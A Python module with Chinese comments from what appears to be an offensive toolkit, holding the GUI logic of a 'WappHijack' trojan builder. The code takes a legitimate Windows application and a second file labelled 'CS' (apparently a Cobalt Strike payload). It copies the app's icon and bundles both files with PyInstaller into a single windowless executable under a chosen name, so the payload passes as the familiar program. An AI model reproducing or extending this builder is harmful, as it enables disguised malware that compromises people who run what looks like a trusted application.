'''
本文件主要用于WappHijack功能中，Gui逻辑部分的代码
'''


import os
import json
import shutil
import subprocess
import win32gui
from PIL import Image
import numpy as np
import win32ui
from GUIfunction.Pops.InfoPop import MessagePopup


class WappLogic:
    def checkNulls(self):
        #检查重要参数是否未填写
        state=True
        if self.confs['app']=='':
            state=False
        elif self.confs['CS']=='':
            state=False
        return state

    def writeConfs(self,name,wapp,cs):
        #创建配置文件
        nameConfs={
            'name':os.path.basename(self.confs['name']),
            'wapp':os.path.basename(self.confs['app']),
            'CS':os.path.basename(self.confs['CS'])
        }
        JsonConfs=json.dumps(nameConfs)
        with open('./Trojans/WappHijack/confs.json','w',encoding='utf-8') as file:
            file.write(JsonConfs)

    def copyFiles(self,wapp,cs):
        #copy文件到工作文件夹
        shutil.copyfile(wapp, '{}/Trojans/WappHijack/files/{}'.format(os.getcwd(),os.path.basename(wapp)))
        shutil.copyfile(cs, "{}/Trojans/WappHijack/files/{}".format(os.getcwd(),os.path.basename(cs)))

    def extractIco(self, wapp):
        """提取应用程序的图标并保存为PNG"""
        try:
            # 创建保存目录
            save_dir = os.path.join(os.getcwd(), "Trojans/WappHijack/files")
            os.makedirs(save_dir, exist_ok=True)

            # 提取图标句柄
            ico_handles = win32gui.ExtractIconEx(wapp, 0)
            if not ico_handles or not ico_handles[0]:
                print(f"未找到图标: {wapp}")
                return None

            ico_handle = ico_handles[0][0]  # 取第一个图标

            # 获取图标信息
            icon_info = win32gui.GetIconInfo(ico_handle)
            hbm = icon_info[4]  # 使用颜色位图 hbmColor（索引4）

            # 转换为位图对象
            bmp = win32ui.CreateBitmapFromHandle(hbm)
            bmp_info = bmp.GetInfo()
            width, height = bmp_info['bmWidth'], bmp_info['bmHeight']

            # 读取位图像素数据
            bits = bmp.GetBitmapBits(True)  # 获取RGB数据
            arr = np.frombuffer(bits, dtype=np.uint8)

            # 处理32位色带Alpha通道的情况
            if arr.size == width * height * 4:
                arr = arr.reshape((height, width, 4))
                arr = arr[..., [2, 1, 0, 3]]  # BGRA转RGBA
                img = Image.fromarray(arr, 'RGBA')
            else:  # 处理24位色不带Alpha的情况
                arr = arr.reshape((height, width, 3))
                arr = arr[..., [2, 1, 0]]  # BGR转RGB
                img = Image.fromarray(arr, 'RGB')

            # 生成文件名
            base_name = os.path.splitext(os.path.basename(wapp))[0]
            save_path = os.path.join(save_dir, f"{base_name}.png")

            # 保存并返回路径
            img.save(save_path)
            print(f"图标已保存至: {save_path}")
            return save_path

        except Exception as e:
            print(f"图标提取失败: {str(e)}")
            return None
        finally:
            # 释放系统资源
            if 'hbm' in locals():
                win32gui.DeleteObject(hbm)
            if 'ico_handle' in locals():
                win32gui.DestroyIcon(ico_handle)


    def creatExe(self,confs):
        #打包exe程序
        try:
            ico = os.path.splitext(os.path.basename(confs['app']))
            script_path = "main.py"
            print(os.path.basename(confs['app']))
            print(os.path.basename(confs['CS']))
            print(ico[0] + ico[1])
            parameters = [
                'pyinstaller',
                '-F',  # 打包成单个可执行文件
                '-w',
                '-i',
                'files/' + ico[0] + '.png',
                '--add-data',
                'files/' + os.path.basename(confs['app']) + ';files',
                '--add-data',
                'files/' + os.path.basename(confs['CS']) + ';files',
                '--add-data',
                'confs.json;.',
                script_path
            ]
            result = subprocess.run(parameters, check=True, cwd=os.getcwd() + "\\Trojans\\WappHijack")
        except Exception as e:
            self.pop=MessagePopup('出错未知错误!!命令执行出错，或者文件未正常copy!!!\n报错内容:{}'.format(e))
            self.pop.show()

    def deleteFiles(self,confs):
        path='Trojans/WappHijack/files/'
        app=path+os.path.basename(confs['app'])
        cs = path+os.path.basename(confs['CS'])
        ico = path+os.path.splitext(os.path.basename(confs['app']))[0]+'.png'
        os.remove(app)
        os.remove(cs)
        os.remove(ico)

    def moveFiles(self,confs):
        src = "Trojans/WappHijack/dist/main.exe"  # 源文件路径
        # dst = "results/"+os.path.basename(confs['app'])  # 目标路径
        dst = "results/" + confs['name']

        try:
            # 若目标路径为目录，文件会被移至该目录下（保留原名）
            shutil.move(src, dst)
            print(f"文件移动成功：{src} -> {dst}")
        except FileNotFoundError:
            print("源文件不存在")
        except PermissionError:
            print("权限不足")
        except shutil.Error as e:  # 处理同名文件冲突等异常
            print(f"移动失败：{e}")


if __name__ == '__main__':
    print('ok')